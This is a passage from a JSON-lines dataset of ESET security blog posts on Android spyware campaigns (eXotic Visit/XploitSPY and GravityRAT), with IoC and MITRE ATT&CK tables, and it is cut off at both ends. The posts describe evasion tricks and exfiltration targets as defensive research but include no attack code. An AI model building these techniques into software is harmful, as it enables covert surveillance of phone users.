Chunghwa Telecom | Taipei | Taiwan | | 118.163.73.0/24 | Chunghwa Telecom | Taipei | Taiwan | | 118.167.21.0/24 | Chunghwa Telecom | Taipei | Taiwan | | 220.129.70.0/24 | Chunghwa Telecom | Taipei | Taiwan | | 106.64.121.0/24 | Far EasTone Telecommunications | Taoyuan City | Taiwan | | 1.169.65.0/24 | Chunghwa Telecom | Xizhi | Taiwan | | 122.100.113.0/24 | Taiwan Mobile | Yilan | Taiwan | | 185.93.229.0/24 | Sucuri Security | Ashburn | United States | | 128.61.64.0/24 | Georgia Institute of Technology | Atlanta | United States | | 216.66.111.0/24 | Vermont Telephone | Wallingford | United States |","num_sentences":244,"metadata":{"source":"blog","platform":"welivesecurity","filename":"evasive-panda"}}
{"id":208,"title":"eXotic Visit campaign: Tracing the footprints of Virtual Invaders","publish_date":"2024-04-10","link":"https://www.welivesecurity.com/en/eset-research/exotic-visit-campaign-tracing-footprints-virtual-invaders/","clean_text":"ESET researchers have discovered an active espionage campaign targeting Android users with apps primarily posing as messaging services.\nWhile these apps offer functional services as bait, they are bundled with open-source XploitSPY malware.\nWe have named this campaign eXotic Visit and have tracked its activities from November 2021 through to the end of 2023.\nThe targeted campaign has been distributing malicious Android apps through dedicated websites and, for some time, through the Google Play store as well.\nBecause of the targeted nature of the campaign, the apps available on Google Play had a low number of installs; all of them have been removed from the store.\nThe eXotic Visit campaign appears to primarily target a select group of Android users in Pakistan and India.\nThere is no indication that this campaign is linked to any known group; however, we are tracking the threat actors behind it under the moniker Virtual Invaders.\nKey points of the report: - This active and targeted Android espionage campaign, which we have named eXotic Visit, started in late 2021 and mainly impersonates messaging apps that are distributed through dedicated websites and Google Play. -\nOverall, at the time of writing, around 380 victims have downloaded the apps from both sources and created accounts to use their messaging functionality.\nBecause of the targeted nature of the campaign, the number of installs of each app from Google Play is relatively low – between zero and 45. -\nDownloaded apps provide legitimate functionality, but also include code from the open-source Android RAT XploitSPY.\nWe have linked the samples through their use of the same C&C, unique and custom malicious code updates, and the same C&C admin panel. -\nThroughout the years, these threat actors have customized their malicious code by adding obfuscation, emulator detection, hiding of C&C addresses, and use of a native library. -\nThe region of interest seems to be South Asia; in particular, victims in Pakistan and India have been targeted. -\nCurrently, ESET Research does not have enough evidence to attribute this activity to any known threat group; we track the group internally as Virtual Invaders.\nApps that contain XploitSPY can extract contact lists and files, get the device’s GPS location and the names of files listed in specific directories related to the camera, downloads, and various messaging apps such as Telegram and WhatsApp.\nIf certain filenames are identified as being of interest, they can subsequently be extracted from these directories via an additional command from the command and control (C&C) server.\nInterestingly, the implementation of the chat functionality integrated with XploitSPY is unique; we strongly believe that this chat function was developed by the Virtual Invaders group.\nThe malware also uses a native library, which is often used in Android app development for improving performance and accessing system features.\nHowever, in this case, the library is used to hide sensitive information, like the addresses of the C&C servers, making it harder for security tools to analyze the app.\nThe apps described in the sections below were taken down from Google Play; moreover, as a Google App Defense Alliance partner, ESET identified ten additional apps that contain code that is based on XploitSPY and shared its findings with Google.\nFollowing our alert, the apps were removed from the store.\nEach of the apps described below had a low number of installs, suggesting a targeted approach rather than a broad strategy.\nThe Timeline of eXotic Visit apps section below describes the “fake”, albeit functional, apps we have identified as part of this campaign, whereas the Technical analysis section focuses on the details of the XploitSPY code, present in various incarnations across those apps.\nTimeline of eXotic Visit apps Starting chronologically, on January 12th, 2022, MalwareHunterTeam shared a tweet with a hash and a link to a website that distributes an app named WeTalk, which impersonates the popular Chinese WeChat application.\nThe website provided a link to a GitHub project to download a malicious Android app.\nBased on the date available on GitHub, the wetalk.apk app was uploaded in December 2021.\nAt that time, there were five apps available, using the names ChitChat.apk, LearnSindhi.apk, SafeChat.apk, wechat.apk, and wetalk.apk.\nThe ChitChat app had been available on GitHub since November 2021, distributed using a dedicated website (chitchat.ngrok[.]io; see Figure 1) as well as the malicious WeTalk app mentioned earlier.\nBoth use the same C&C address with the admin panel login interface shown in Figure 2.\nSince July 2023, the same GitHub account has hosted new malicious Android apps that have the same malicious code and C&C server.\nWe don’t have any information on how these apps are distributed.\nApps are stored in five repositories, using names such as ichat.apk, MyAlbums.apk, PersonalMessenger.apk, Photo Collage Grid & Pic Maker.apk, Pics.apk, PrivateChat.apk, SimInfo.apk, Specialist Hospital.apk, Spotify_ Music and Podcasts.apk, TalkUChat.apk, and Themes for Android.apk.\nReturning to ChitChat.apk and wetalk.apk: both apps contain the promised messaging functionality, but also include malicious code we have identified as the open-source XploitSPY available on GitHub.\nXploitSPY is based on another open-source Android RAT called L3MON; however, it was removed from GitHub by its author.\nL3MON was inspired by yet another open-source Android RAT named AhMyth, with extended functionality (we covered another AhMyth-derived Android RAT in this WeLiveSecurity blogpost).\nEspionage and remote control of the targeted device are the main purposes of the app.\nIts malicious code is capable of: - listing files on the device, - sending SMS messages, - obtaining call logs, contacts, text messages, and a list of installed apps, - getting a list of surrounding Wi-Fi networks, device location, and user accounts, - taking pictures using the camera, - recording audio from the device’s surroundings, and - intercepting notifications received for WhatsApp, Signal, and any other notification that contains the string new messages.\nThe last function might be a lazy attempt to intercept received messages from any messaging app.\nThe same C&C address that was used by previously mentioned apps (wechat.apk and ChitChat.apk) is also used by Dink Messenger.\nBased on VirusTotal’s in-the-wild URLs, this sample was available for download from letchitchat[.]info on February 24th, 2022.\nThat domain was registered on January 28th, 2022.\nOn top of messaging functionality, the attackers added malicious code based on XploitSPY.\nOn November 8th, 2022, MalwareHunterTeam tweeted a hash of the malicious Android alphachat.apk app with its download website.\nThe app was available for download on the same domain as the Dink Messenger app (letchitchat[.]info).\nThe Alpha Chat app uses the same C&C server and C&C admin panel login page as in Figure 2, but on a different port; the app also contains the same malicious code.\nWe don’t have information about when Dink Messenger was available on the domain; subsequently, it was replaced by Alpha Chat.\nThe trojanized Alpha Chat app, compared to previous versions of XploitSPY from the eXotic Visit campaign, contains a malicious code update that includes emulator detection.\nIf this app detects that it is running in an emulator, then it uses a fake C&C address instead of revealing the real one, as shown in Figure 3.\nThis should most likely prevent automated malware sandboxes, while performing dynamic analysis, from identifying the actual C&C server.\nAlpha Chat also uses an additional C&C address to exfiltrate non-image files with a size over 2 MB.\nOther files are exfiltrated via a web socket to the C&C server.\nThat is a connection between the Dink Messenger and Alpha Chat apps: both were distributed on the same dedicated website.\nHowever, Dink Messenger was also carefully distributed through the Google Play store: Version 1.0 of Dink Messenger appeared on Google Play on February 8th, 2022, but with no malicious functionality included.\nThis might have been a test by the threat actor to see whether the app would be validated and successfully uploaded to the store.\nOn May 24th, 2022, version 1.2 was uploaded, still without malicious functionality.\nAt that time the app was installed over 15 times.\nOn June 10th, 2022, version 1.3 was uploaded to Google Play.\nThis version contained malicious code, as shown in Figure 4.\nSubsequently, three more versions were uploaded to Google Play with the same malicious code; the last, version 1.6, was uploaded on December 15th, 2022.\nAll in all, these six versions have over 40 installs.\nWe have no information on when the app was removed from the store.\nAll the app versions with and without malicious code were signed by the same developer certificate, which means they were built and pushed to Google Play by the same malicious developer.\nIt is also important to mention that the Dink Messenger app available on letchitchat[.]info used the same C&C server as the Dink Messenger app on Google Play, and could perform extended malicious actions; however, the user interface of each was different (see Figure 5).\nDink Messenger on Google Play implemented emulator checks (just as Alpha Chat), whereas the one on the dedicated website did not.\nOn August 15th, 2022, the Telco DB app (with the package name com.infinitetechnology.telcodb), which claims to provide information about the owners of phone numbers, was uploaded to an alternative app store; see Figure 6.\nThis app has the same malicious code, a newly added emulator check with fake C&C address redirection, and an additional C&C server for file exfiltration.\nThe C&C address is not hardcoded, as in previous cases; rather, it is returned from a Firebase server.\nWe believe that this is another trick to hide the real C&C server, and perhaps even to update it in the future.\nWith a high level of confidence, we assess that this app is a part of the eXotic Visit campaign.\nFour days later, on August 19th, 2022, the Sim Info app was uploaded to Google Play as part of the campaign.\nIt also claims to provide the user with information about who owns a phone number.\nThe malicious code communicates with the same C&C server as previous samples and is otherwise the same except that the threat actors included a native library.\nWe elaborate on this native library in the Toolset section.\nSim Info reached over 30 installs on Google Play; we have no information about when it was removed from the store.\nOn June 21st, 2023, the malicious Defcom app was uploaded to Google Play; see Figure 7.\nDefcom is a trojanized messaging app that is part of the eXotic Visit campaign, using the same malicious code and native library to retrieve its C&C server.\nIt uses a new C&C server, but with the same admin panel login interface shown in Figure 2.\nThis C&C domain (zee.xylonn[.]com) was registered on June 2nd, 2023.\nBefore the app was removed, sometime in June 2023, it reached around six installs on Google Play.\nIn Figure 8, we illustrate a timeline of when all the apps were first available for download as part of the campaign.\nBesides the already mentioned malicious apps that are part of the campaign, we were able to identify additional apps were uploaded to Google Play, and others where an attempt was made to upload, but we're unable to tell whether the uploads were successful.\nAlthough we identified them based on the same detection names, we were not able to obtain the samples to analyze them and verify whether they are part of the same campaign.\nIn any case, they contain malicious code that is based on XploitSPY.\nTable 1 list XploitSPY apps that were available on Google Play.\nEach of these apps had a low number of installs.\nA substantial number of the apps that were available on Google Play had zero installs, with some yielding under 10 installs.\nThe highest install count from the Play Store came in at under 45.\nTable 1.\nMore XploitSPY-containing apps that were available on Google Play | App name | Package name | Date uploaded to Google Play | | Zaangi Chat | com.infinite.zaangichat | July 22nd, 2022 | | Wicker Messenger | com.reelsmart.wickermessenger | August 25th, 2022 | | Expense Tracker | com.solecreative.expensemanager | November 4th, 2022 | Table 2 lists the malicious apps that developers tried to upload on Google Play; however, we have no information about whether or not they became available on Google Play.\nTable 2.\nXploitSPY-containing apps that were uploaded on Google Play | App name | Package name | Date uploaded to Google Play | | Signal Lite | com.techexpert.signallite | December 1st, 2021 | | Telco DB | com.infinitetech.telcodb | July 25th, 2022 | | Telco DB | com.infinitetechnology.telcodb | July 29th, 2022 | | Tele Chat | com.techsight.telechat | November 8th, 2022 | | Track Budget | com.solecreative.trackbudget | December 30th, 2022 | | SnapMe | com.zcoders.snapme | December 30th, 2022 | | TalkU | com.takewis.talkuchat | February 14th, 2023 | ESET is a member of the App Defense Alliance and an active partner in the malware mitigation program, which aims to quickly find Potentially Harmful Applications (PHAs) and stop them before they ever make it onto Google Play.\nAs a Google App Defense Alliance partner, ESET identified all mentioned apps as malicious and shared its findings with Google, who subsequently unpublished them.\nAll the apps identified in the report that were on Google Play are no longer available on the Play store.\nVictimology Our research indicates that malicious apps developed by eXotic Visit were distributed through Google Play and dedicated websites, and four of those apps mostly targeted users in Pakistan and India.\nWe detected one of those four apps, Sim Info, on an Android device in Ukraine, but we don’t think Ukraine is being targeted specifically, as the app was available on Google Play for anyone to download.\nBased on our data, each of the malicious apps available on Google Play was downloaded tens of times; however, we don’t have any visibility into the download details.\nWe identified potential targets for four of these apps: Sim Info, Telco DB (com.infinitetechnology.telcodb), Shah jee Foods, and Specialist Hospital.\nThe Sim Info and Telco DB apps provide users the functionality to search for SIM owner information for any Pakistani mobile number, using the online service dbcenteruk.com; see Figure 9.\nOn July 8th, 2022, an app named Shah jee Foods was uploaded to VirusTotal from Pakistan.\nThis app is part of the campaign.\nAfter startup, it displays a food ordering website for the Pakistan region, foodpanda.pk.\nThe Specialist Hospital app, available on GitHub, poses as the app for Specialist Hospital in India (specialisthospital.in); see Figure 10.\nAfter starting, the app requests the permissions necessary to perform its malicious activities and then requests user to install the legitimate app from Google Play.\nWe were able to find over 380 compromised accounts created in some of these apps; however, we were not able to retrieve their geolocation.\nSince the same insecure code was found in ten apps, we can say with a high level of confidence that they were developed by the same threat actor.\nAttribution We track this operation, active since the end of 2021, as eXotic Visit, but based on ESET research and that of others, we cannot attribute this campaign to any known group.\nAs a result, we have internally labeled the group behind this operation as Virtual Invaders.\nXploitSPY is widely available and customized versions have been used by multiple threat actors such as the Transparent Tribe APT group, as documented by Meta.\nHowever, the modifications found in the apps we describe as part of the eXotic Visit campaign are distinctive and differ from those in previously documented variants of the XploitSPY malware.\nTechnical analysis Initial access Initial access to the device is gained by tricking a potential victim into installing a fake, but functional, app.\nAs described in the Timeline of eXotic Visit apps section, the malicious ChitChat and WeTalk apps were distributed via dedicated websites (chitchat.ngrok[.]io and wetalk.ngrok[.]io, respectively), and hosted on GitHub (https://github[.]com/Sojal87/).\nAt that time, three more apps – LearnSindhi.apk, SafeChat.apk, and wechat.apk – were available from the same GitHub account; we are not aware of their distribution vector.\nAs of July 2023, these apps were not available for download from their GitHub repositories anymore.\nHowever, the same GitHub account now hosts several new malicious apps available for download.\nAll of these new apps are also part of the malicious eXotic Visit espionage campaign, due to also containing variants of the same XploitSPY code.\nThe Dink Messenger and Alpha Chat apps were hosted on a dedicated website (letchitchat[.]info), from which victims were enticed into downloading and installing the app.\nThe Dink Messenger, Sim Info, and Defcom apps had been available on Google Play until their removal by Google.\nToolset All analyzed apps contain customizations of the code from the malicious XploitSPY app available on GitHub.\nSince the first version found in 2021 until the latest version, first distributed in July 2023, we have seen continuing development efforts.\nVirtual Invaders has included: - usage of a fake C&C server if an emulator is detected, - code obfuscation, - an attempt to hide the C&C addresses from static analysis by retrieving it from its Firebase server, and - use of a native library that keeps the C&C server and other information encoded and hidden from static analysis tools.\nWhat follows is our analysis of custom XploitSPY malware that, in the Defcom app, was available on Google Play.\nDefcom integrates XploitSPY code with a unique chat functionality; we believe with high level of confidence the chat functionality was created by Virtual Invaders.\nThis applies to all of the other messaging apps that have XploitSPY included.\nAfter its initial start, the app prompts users to create an account and simultaneously attempts to obtain device location details by querying api.ipgeolocation.io and forwarding the result to a Firebase server.\nThis server also functions as the messaging component’s server.\nThe app interface is shown in Figure 11.\nDefcom utilizes a native library, often used in Android app development for performance enhancement and system feature access.\nWritten in C or C++, these libraries can be used to conceal malicious functionalities.\nDefcom’s native library is named defcome-lib.so.\ndefcome-lib.so’s purpose is to hide sensitive information such as C&C servers from static app analysis.\nMethods implemented in the library return a base64-encoded string that is then decoded by the malicious code during runtime.\nThis technique isn’t very sophisticated, but it prevents static analysis tools from extracting C&C servers.\nFigure 12 shows the native method declarations in the Java code, and Figure 13 the implementation of the getServerUrl method in assembly code.\nNote that the comment above each declaration in Figure 12 is the decoded return value when calling that method.\nThe commands to execute on the compromised device are returned from the C&C server.\nEach command is represented by a string value.\nThe list of the commands is: - 0xCO – Get contact list. -\n0xDA – Exfiltrate file from device.\nThe path to the file is received from the C&C server. -\n0xFI – List files in the directory specified by the server.\nWith an additional argument it can upload files from a specified directory to the C&C server. -\n0xIP – Get device geolocation using the ipgeolocation.io service. -\n0xLO – Get device GPS location. -\n0xOF – List files in seven specific directories.\nIn four cases the file paths are hardcoded, in three cases only folder names.\nAn additional argument specifies the directory: - 0xCA – Camera - 0xDW – Downloads - 0xSS – /storage/emulated/0/Pictures/Screenshots - 0xTE – Telegram - 0xWB – /storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media - 0xWG – /storage/emulated/0/Android/media/com.gbwhatsapp/GBWhatsApp/Media - 0xWP – /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media Interestingly, GB WhatsApp is an unofficial cloned version of WhatsApp.\nWhile it offers additional features that have made it quite popular, it is important to note that it’s not available on Google Play.\nInstead, it is often found on various download websites, where versions of it are frequently riddled with malware.\nThe app has a substantial user base in several countries, including India, despite its associated security risks.\nFigure 14 and Figure 15 show the exfiltration of a contact list and a directory listing.\nNetwork infrastructure Virtual Invaders use ngrok as its C&C server; the service is a cross-platform application that enables developers to expose a local development server to the internet.\nngrok can create a tunnel that connects using ngrok servers to a local machine.\nngrok allows its users – so, the attackers in this case – to reserve a particular IP address or redirect the victim to the attacker’s own domain on a specific port.\nConclusion We have described the eXotic Visit campaign, operated by the Virtual Invaders threat actor, which has been active since at least the end of 2021.\nThroughout the years the campaign has evolved.\nDistribution started on dedicated websites and then even moved to the official Google Play store.\nWe have identified the malicious code used as a customized version of the open-source Android RAT, XploitSPY.\nIt is bundled with legitimate app functionality, most of the time being a fake, but functioning, messaging application.\nThe campaign has evolved over the years to include obfuscation, emulator detection, and hiding of C&C addresses.\nThe purpose of the campaign is espionage and probably is targeting victims in Pakistan and India.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | ESET detection name | Description | | C9AE3CD4C3742CC3353A | alphachat.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 89109BCC3EC5B8EC1DC9 | com.appsspot.defcom.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | BB28CE23B3387DE43EFB | com.egoosoft.siminfo-4-apksos.com.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 7282AED684FB1706F026 | com.infinitetech.dinkmessenger_v1_3.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | B58C18DB32B72E6C0054 | com.infinitetechnology.telcodb.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | A17F77C0F98613BF349B | dinkmessenger.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 991E820274AA02024D45 | ChitChat.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 7C7896613EB6B54B9E9A | ichat.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 17FCEE9A54AD174AF971 | MyAlbums.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 3F0D58A6BA8C0518C8DF | PersonalMessenger.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | A7AB289B61353B632227 | PhotoCollageGridAndPicMaker.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | FA6624F80BE92406A397 | Pics.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 4B8D6B33F3704BDA0E69 | PrivateChat.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 706E4E701A9A2D42EF35 | Shah_jee_Foods__com.electron.secureapp.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | A92E3601328CD9AF3A69 | SimInfo.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 6B71D58F8247FFE71AC4 | SpecialistHospital.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 9A92224A0BEF9EFED027 | Spotify_Music_and_Podcasts.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 7D50486C150E9E4308D7 | TalkUChat.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 50B896E999FA96B5AEBD | Themes_for_Android.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| | 0D9F42CE346090F7957C | wetalk.apk | Android/Spy.\nXploitSPY.A | XploitSPY malware.\n| Network | IP | Domain | Hosting provider | First seen | Details | | 3.13.191[.]225 | phpdownload.ngrok[.]io | Amazon.com, Inc. | 2022-11-14 | C&C server.\n| | 3.22.30[.]40 | chitchat.ngrok[.]io wetalk.ngrok[.]io | Amazon.com, Inc. | 2022-01-12 | Distribution websites.\n| | 3.131.123[.]134 | 3.tcp.ngrok[.]io | Amazon Technologies Inc. | 2020-11-18 | C&C server.\n| | 3.141.160[.]179 | zee.xylonn[.]com | Amazon.com, Inc. | 2023‑07‑29 | C&C server.\n| | 195.133.18[.]26 | letchitchat[.]info | Serverion LLC | 2022‑01‑27 | Distribution website.\n| MITRE ATT&CK techniques This table was built using version 14 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Persistence | Event Triggered Execution: Broadcast Receivers | XploitSPY registers to receive the BOOT_COMPLETED broadcast intent to activate on device startup.\n| | | Defense evasion | Native API | XploitSPY uses a native library to hide its C&C servers.\n| | | Virtualization/Sandbox Evasion: System Checks | XploitSPY can detect whether it is running in an emulator and adjust its behavior accordingly.\n| || | Discovery | Software Discovery | XploitSPY can obtain a list of installed applications.\n| | | File and Directory Discovery | XploitSPY can list files and directories on external storage.\n| || | System Information Discovery | XploitSPY can extract information about the device including device model, device ID, and common system information.\n| || | Collection | Data from Local System | XploitSPY can exfiltrate files from a device.\n| | | Access Notifications | XploitSPY can collect messages from various apps.\n| || | Audio Capture | XploitSPY can record audio from the microphone.\n| || | Clipboard Data | XploitSPY can obtain clipboard contents.\n| || | Location Tracking | XploitSPY tracks device location.\n| || | Protected User Data: Call Logs | XploitSPY can extract call logs.\n| || | Protected User Data: Contact List | XploitSPY can extract the device’s contact list.\n| || | Protected User Data: SMS Messages | XploitSPY can extract SMS messages.\n| || | Command and Control | Application Layer Protocol: Web Protocols | XploitSPY uses HTTPS to communicate with its C&C server.\n| | | Non-Standard Port | XploitSPY communicates with its C&C server using HTTPS requests over port 21,572, 28,213, or 21,656.\n| || | Exfiltration | Exfiltration Over C2 Channel | XploitSPY exfiltrates data using HTTPS.\n|","num_sentences":228,"metadata":{"source":"blog","platform":"welivesecurity","filename":"exotic"}}
{"id":209,"title":"Android GravityRAT goes after WhatsApp backups","publish_date":"2023-06-15","link":"https://www.welivesecurity.com/2023/06/15/android-gravityrat-goes-after-whatsapp-backups/","clean_text":"ESET researchers have identified an updated version of Android GravityRAT spyware being distributed as the messaging apps BingeChat and Chatico.\nGravityRAT is a remote access tool known to be used since at least 2015 and previously used in targeted attacks against India.\nWindows, Android, and macOS versions are available, as previously documented by Cisco Talos, Kaspersky, and Cyble.\nThe actor behind GravityRAT remains unknown; we track the group internally as SpaceCobra.\nMost likely active since August 2022, the BingeChat campaign is still ongoing; however, the campaign using Chatico is no longer active.\nBingeChat is distributed through a website advertising free messaging services.\nNotable in the newly discovered campaign, GravityRAT can exfiltrate WhatsApp backups and receive commands to delete files.\nThe malicious apps also provide legitimate chat functionality based on the open-source OMEMO Instant Messenger app.\nKey points of this blogpost: - We discovered a new version of Android GravityRAT spyware being distributed as trojanized versions of the legitimate open-source OMEMO Instant Messenger Android app. -\nThe trojanized BingeChat app is available for download from a website that presents it as a free messaging and file sharing service. -\nThis version of GravityRAT is enhanced with two new capabilities: receiving commands to delete files and exfiltrating WhatsApp backup files.\nCampaign overview We were alerted to this campaign by MalwareHunterTeam, which shared the hash for a GravityRAT sample via a tweet.\nBased on the name of the APK file, the malicious app is branded as BingeChat and claims to provide messaging functionality.\nWe found the website bingechat[.]net from which this sample might have been downloaded (see Figure 1).\nThe website should provide the malicious app after tapping the DOWNLOAD APP button; however, it requires visitors to log in.\nWe didn’t have credentials, and registrations were closed (see Figure 2).\nIt is most probable that the operators only open registration when they expect a specific victim to visit, possibly with a particular IP address, geolocation, custom URL, or within a specific timeframe.\nTherefore, we believe that potential victims are highly targeted.\nAlthough we couldn’t download the BingeChat app via the website, we were able to find a URL on VirusTotal (https://downloads.bingechat[.]net/uploadA/c1d8bad13c5359c97cab280f7b561389153/BingeChat.zip) that contains the malicious BingeChat Android app.\nThis app has the same hash as the app in the previously mentioned tweet, which means that this URL is a distribution point for this particular GravityRAT sample.\nThe same domain name is also referenced within the code of the BingeChat app – another hint that bingechat[.]net is used for distribution (see Figure 3).\nThe malicious app has never been made available in the Google Play store.\nIt is a trojanized version of the legitimate open-source OMEMO Instant Messenger (IM) Android app, but is branded as BingeChat.\nOMEMO IM is a rebuild of the Android Jabber client Conversations.\nAs you can see in Figure 4, the HTML code of the malicious site includes evidence that it was copied from the legitimate site preview.colorlib.com/theme/BingeChat/ on July 5th, 2022, using the automated tool HTTrack; colorlib.com is a legitimate website that provides WordPress themes for download, but the BingeChat theme seems to no longer be available there.\nThe bingechat[.]net domain was registered on August 18th, 2022.\nWe do not know how potential victims were lured to, or otherwise discovered, the malicious website.\nConsidering that downloading the app is conditional on having an account and new account registration was not possible for us, we believe that potential victims were specifically targeted.\nThe attack overview scheme is shown in Figure 5.\nVictimology ESET telemetry data has not recorded any victims of this BingeChat campaign, further suggesting that the campaign is probably narrowly targeted.\nHowever, our telemetry has one detection of another Android GravityRAT sample in India that occurred in June 2022.\nIn this case, GravityRAT was branded as Chatico (see Figure 6).\nLike BingeChat, Chatico is based on the OMEMO Instant Messenger app and trojanized with GravityRAT.\nChatico was most likely distributed through the chatico.co[.]uk website and also communicated with a C&C server.\nThe domains for both the website and C&C server are now offline.\nFrom here on out, we will only focus on the active campaign using the BingeChat app, which has the same malicious functionality as Chatico.\nAttribution The group behind the malware remains unknown, even though Facebook researchers attribute GravityRAT to a group based in Pakistan, as also previously speculated by Cisco Talos.\nWe track the group internally under the name SpaceCobra, and attribute both the BingeChat and Chatico campaigns to this group.\nTypical malicious functionality for GravityRAT is associated with a specific piece of code that, in 2020, was attributed by Kaspersky to a group that uses Windows variants of GravityRAT In 2021, Cyble published an analysis of another GravityRAT campaign that exhibited the same patterns as BingeChat, such as a similar distribution vector for the trojan masquerading as a legit chat app, which in this case was SoSafe Chat, the use of the open-source OMEMO IM code, and the same malicious functionality.\nIn Figure 6, you can see a comparison of malicious classes between the GravityRAT sample analyzed by Cyble and the new sample contained in BingeChat.\nBased on this comparison, we can state with high confidence that the malicious code in BingeChat belongs to the GravityRAT malware family Technical analysis After launch, the app requests the user to allow all the necessary permissions to work properly, as shown in Figure 8.\nExcept for permission to read the call logs, the other requested permissions are typical of any messaging application, so the device user might not be alarmed when the app requests them.\nAs part of the app’s legitimate functionality, it provides options to create an account and log in.\nBefore the user signs into the app, GravityRAT starts to interact with its C&C server, exfiltrating the device user’s data and waiting for commands to execute.\nGravityRAT is capable of exfiltrating: - call logs - contact list - SMS messages - files with specific extensions: jpg, jpeg, log, png, PNG, JPG, JPEG, txt, pdf, xml, doc, xls, xlsx, ppt, pptx, docx, opus, crypt14, crypt12, crypt13, crypt18, crypt32 - device location - basic device information Data to be exfiltrated is stored in text files on external media, then exfiltrated to the C&C server, and finally removed.\nThe file paths for the staged data are listed in Figure 9.\nThis version of GravityRAT has two small updates compared to previous, publicly known versions of GravityRAT.\nFirst, it extends the list of files to exfiltrate to those with the crypt14, crypt12, crypt13, crypt18, and crypt32 extensions.\nThese crypt files are encrypted backups created by WhatsApp Messenger.\nSecond, it can receive three commands from a C&C server to execute: - DeleteAllFiles – deletes files with a particular extension, exfiltrated from the device - DeleteAllContacts – deletes contact list - DeleteAllCallLogs – deletes call logs These are very specific commands that are not typically seen in Android malware.\nPrevious versions of Android GravityRAT could not receive commands at all; they could only upload exfiltrated data to a C&C server at a particular time.\nGravityRAT contains two hardcoded C&C subdomains shown in Figure 10; however, it is coded to use only the first one (https://dev.androidadbserver[.]com).\nThis C&C server is contacted to register a new compromised device, and to retrieve two additional C&C addresses: https://cld.androidadbserver[.]com and https://ping.androidadbserver[.]com when we tested it, as shown in Figure 11.\nAgain, only the first C&C server is used, this time to upload the device user’s data, as seen in Figure 12.\nConclusion Known to have been active since at least 2015, SpaceCobra has resuscitated GravityRAT to include expanded functionalities to exfiltrate WhatsApp Messenger backups and receive commands from a C&C server to delete files.\nJust as before, this campaign employs messaging apps as a cover to distribute the GravityRAT backdoor.\nThe group behind the malware uses legitimate OMEMO IM code to provide the chat functionality for the malicious messaging apps BingeChat and Chatico.\nAccording to ESET telemetry, a user in India was targeted by the updated Chatico version of the RAT, similar to previously documented SpaceCobra campaigns.\nThe BingeChat version is distributed through a website that requires registration, likely open only when the attackers expect specific victims to visit, possibly with a particular IP address, geolocation, custom URL, or within a specific timeframe.\nIn any case, we believe the campaign is highly targeted.\nIoCs Files | SHA-1 | Package name | ESET detection name | Description | |---|---|---|---| | 2B448233E6C9C4594E385E799CEA9EE8C06923BD | eu.siacs.bingechat | Android/Spy.\nGravity.\nA | GravityRAT impersonating BingeChat app.\n| | 25715A41250D4B9933E3599881CE020DE7FA6DC3 | eu.siacs.bingechat | Android/Spy.\nGravity.\nA | GravityRAT impersonating BingeChat app.\n| | 1E03CD512CD75DE896E034289CB2F5A529E4D344 | eu.siacs.chatico | Android/Spy.\nGravity.\nA | GravityRAT impersonating Chatico app.\n| Network | IP | Domain | Hosting provider | First seen | Details | |---|---|---|---|---| | 75.2.37[.]224 | jre.jdklibraries[.]com | Amazon.com, Inc. | 2022-11-16 | Chatico C&C server.\n| | 104.21.12[.]211 | cld.androidadbserver[.]com adb.androidadbserver[.]com | Cloudflare, Inc. | 2023‑03‑16 | BingeChat C&C servers.\n| | 104.21.24[.]109 | dev.jdklibraries[.]com | Cloudflare, Inc. | N/A | Chatico C&C server.\n| | 104.21.41[.]147 | chatico.co[.]uk | Cloudflare, Inc. | 2021-11-19 | Chatico distribution website.\n| | 172.67.196[.]90 | dev.androidadbserver[.]com ping.androidadbserver[.]com | Cloudflare, Inc. | 2022-11-16 | BingeChat C&C servers.\n| | 172.67.203[.]168 | bingechat[.]net | Cloudflare, Inc. | 2022‑08‑18 | BingeChat distribution website.\n| Paths Data is staged for exfiltration in the following places: /storage/emulated/0/Android/ebc/oww.log /storage/emulated/0/Android/ebc/obb.log /storage/emulated/0/bc/ms.log /storage/emulated/0/bc/cl.log /storage/emulated/0/bc/cdcl.log /storage/emulated/0/bc/cdms.log /storage/emulated/0/bc/cs.log /storage/emulated/0/bc/location.log MITRE ATT&CK techniques This table was built using version 13 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | |---|---|---|---| | Persistence | T1398 | Boot or Logon Initialization Scripts | GravityRAT receives the BOOT_COMPLETED broadcast intent to activate at device startup.\n| | T1624.001 | Event Triggered Execution: Broadcast Receivers | GravityRAT functionality is triggered if one of these events occurs: USB_DEVICE_ATTACHED, ACTION_CONNECTION_STATE_CHANGED, USER_UNLOCKED, ACTION_POWER_CONNECTED, ACTION_POWER_DISCONNECTED, AIRPLANE_MODE, BATTERY_LOW, BATTERY_OKAY, DATE_CHANGED, REBOOT, TIME_TICK, or CONNECTIVITY_CHANGE.\n| | | Defense Evasion | T1630.002 | Indicator Removal on Host: File Deletion | GravityRAT removes local files that contain sensitive information exfiltrated from the device.\n| | Discovery | T1420 | File and Directory Discovery | GravityRAT lists available files on external storage.\n| | T1422 | System Network Configuration Discovery | GravityRAT extracts the 